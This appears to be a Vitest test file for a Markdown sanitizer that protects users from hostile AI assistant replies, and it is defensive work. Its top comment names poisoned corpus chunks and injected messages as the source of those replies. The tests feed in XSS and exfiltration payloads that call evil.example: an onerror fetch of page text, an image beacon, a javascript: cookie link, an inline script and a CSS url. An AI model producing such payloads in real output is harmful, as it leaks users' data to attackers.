// @vitest-environment jsdom
import {describe, it, expect} from "vitest";
import {renderMarkdown} from "@/lib/sanitize";

// renderMarkdown is the guard that stops a hostile assistant reply (a poisoned
// corpus chunk, a directory row, or a message another person injected into a
// shared anonymous conversation) from executing or beaconing in the victim's
// browser when it is written out with v-html. These tests pin that guarantee.

describe("renderMarkdown — strips exfiltration/XSS vectors", () => {
    it("drops an onerror handler and the <img> that carries it", () => {
        const out = renderMarkdown(
            'x\n\n<img src=x onerror="fetch(\'https://evil.example/?\'+document.body.innerText)">',
        );
        expect(out).not.toMatch(/onerror/i);
        expect(out).not.toMatch(/<img/i);
        expect(out).not.toContain("evil.example");
    });

    it("drops a remote image beacon written as Markdown", () => {
        const out = renderMarkdown("![](https://evil.example/beacon?q=asylum)");
        expect(out).not.toMatch(/<img/i);
        expect(out).not.toContain("evil.example");
    });

    it("neutralizes a javascript: link", () => {
        const out = renderMarkdown("[click](javascript:alert(document.cookie))");
        expect(out).not.toMatch(/javascript:/i);
    });

    it("removes an inline <script>", () => {
        const out = renderMarkdown("hi\n\n<script>fetch('https://evil.example')</script>");
        expect(out).not.toMatch(/<script/i);
        expect(out).not.toContain("evil.example");
    });

    it("strips an inline style attribute (CSS-url exfil surface)", () => {
        const out = renderMarkdown('<p style="background:url(https://evil.example/x)">hi</p>');
        expect(out).not.toMatch(/style=/i);
        expect(out).not.toContain("evil.example");
    });
});

describe("renderMarkdown — preserves legitimate content", () => {
    it("renders ordinary Markdown", () => {
        const out = renderMarkdown("# Title\n\n**bold** and a list:\n\n- one\n- two");
        expect(out).toMatch(/<h1[^>]*>Title<\/h1>/);
        expect(out).toMatch(/<strong>bold<\/strong>/);
        expect(out).toMatch(/<li>one<\/li>/);
    });

    it("keeps an https link and hardens it (no referrer leak, new tab)", () => {
        const out = renderMarkdown("[USCIS](https://www.uscis.gov)");
        expect(out).toContain('href="https://www.uscis.gov"');
        expect(out).toContain('target="_blank"');
        expect(out).toContain('rel="noopener noreferrer nofollow"');
    });

    it("returns an empty string for empty/nullish input", () => {
        expect(renderMarkdown("")).toBe("");
        expect(renderMarkdown(null)).toBe("");
        expect(renderMarkdown(undefined)).toBe("");
    });
});
